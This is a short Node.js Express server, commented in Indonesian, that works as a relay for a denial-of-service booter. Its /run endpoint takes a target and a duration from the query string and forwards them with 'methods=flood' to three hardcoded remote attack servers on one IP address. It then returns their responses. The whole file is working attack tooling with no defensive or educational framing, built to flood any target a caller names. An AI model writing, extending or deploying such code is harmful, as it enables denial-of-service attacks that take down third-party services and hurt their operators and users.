const express = require("express");
const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 3000;

// endpoint lo
const endpoints = [
  "http://178.128.95.130:2159/permen",
  "http://178.128.95.130:2281/permen",
  "http://178.128.95.130:2261/permen"
];

// enable CORS
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  next();
});

// helper fetch + parse JSON
async function fetchAndParse(url) {
  try {
    const res = await fetch(url);
    const text = await res.text();

    try {
      return JSON.parse(text); // 🔥 FIX UTAMA
    } catch {
      return { raw: text };
    }

  } catch (err) {
    return { error: err.toString() };
  }
}

app.get("/run", async (req, res) => {
  const { target, time } = req.query;

  if (!target || !time) {
    return res.status(400).json({
      success: false,
      error: "target & time wajib diisi"
    });
  }

  try {
    const urls = endpoints.map(base =>
      `${base}?target=${encodeURIComponent(target)}&time=${time}&methods=flood`
    );

    const results = await Promise.all(
      urls.map(url => fetchAndParse(url))
    );

    res.json({
      success: true,
      count: results.length,
      results
    });

  } catch (err) {
    res.json({
      success: false,
      error: err.toString()
    });
  }
});

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
